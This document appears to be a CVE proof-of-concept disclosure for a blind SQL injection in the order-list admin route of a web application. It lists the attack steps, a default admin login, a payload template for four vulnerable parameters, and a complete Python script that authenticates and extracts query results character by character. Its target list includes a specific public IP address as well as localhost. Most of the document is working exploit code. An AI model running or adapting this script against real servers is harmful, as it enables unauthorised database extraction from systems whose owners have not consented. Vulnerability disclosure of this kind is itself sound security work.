# CVE-2024-24323

## Attack Process
1. Visit website `https://47.119.164.125/` or locally hosted site, `http://127.0.0.1:9527`, that you've set up yourself.
2. Be admin via admin123/admin123
3. SQLi will occur on the parameters `nickname`, `consignee`, `orderSN`, and `orderStatusArray` of the route `/admin/order/list`. Use payload which is similar to `%' and ascii(substr(({sql}),{num},1))>{mid} and '%' = '` where {sql} is the SQL query statement being executed.
4. Here is an EXAMPLE of EXP.


## EXP
```
import requests

basic_url = "https://47.119.164.125"
# basic_url = "http://127.0.0.1:9527"

# the SQL query statement being executed
sql = "user()"

def bool_blind(sql, num):
    low = 32
    high = 128
    mid = (low+high)//2
    while low < high:
        route_path = f"/admin/order/list?page=1&limit=1&sort=add_time&order=desc&start=&end=&nickname=%' and ascii(substr(({sql}),{num},1))>{mid} and '%' = '"
        r = s.get(
            basic_url+route_path,
            verify=False
        )
        print(len(r.text))
        if len(r.text) < 100:
            high = mid
        else:
            low = mid+1
        mid=(low+high)//2
    if mid <= 32 or mid >= 127:
        return chr(mid)
    return chr(mid)

s = requests.Session()
# login
login_path = "/admin/auth/login"
r = s.post(
    basic_url+login_path, 
    json={
        "username": "admin123",
        "password": "admin123",
        "code": ""
    },
    verify=False
)
for l in range(20):
    route_path = f"/admin/order/list?page=1&limit=20&sort=add_time&order=desc&start=&end=&nickname=%' and length({sql})>{l} and '%' = '"
    print(basic_url + route_path)
    r = s.get(
        basic_url + route_path,
        verify=False
    )
    if len(r.text) < 100:
        break
print(l)

res = ""
for i in range(l+1):
    res += bool_blind(sql,i)
print(res)
```

